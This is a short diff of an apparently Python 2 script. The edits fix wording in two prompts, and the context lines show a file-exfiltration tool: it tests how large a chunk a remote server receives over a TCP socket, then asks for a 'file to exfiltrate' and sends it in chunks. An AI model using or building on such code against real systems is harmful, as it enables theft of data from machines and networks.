@@ -52,7 +52,7 @@ def testChunk(server, port):
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(15)
             s.connect((server, port))
-            print 'sending ' + str(curBytes) + ' bytes of test data.  Watch the server to see how much is received.'
+            print 'sending ' + str(curBytes) + ' of test data.  Watch the server to see how much is received.'
             s.send(testData)
             s.close()
 
@@ -71,7 +71,7 @@ def testChunk(server, port):
 
 def sendFile(server, port):
     fileName = raw_input('Enter path to file to exfiltrate: ')
-    chunkSize = int(raw_input('Enter size of file chunk (use max chunk or less in server output: '))
+    chunkSize = int(raw_input('Enter size of file chunk (use max chunk or less in server output): '))
     chunkCount = 1
     with open(fileName,"rb") as in_file:
 
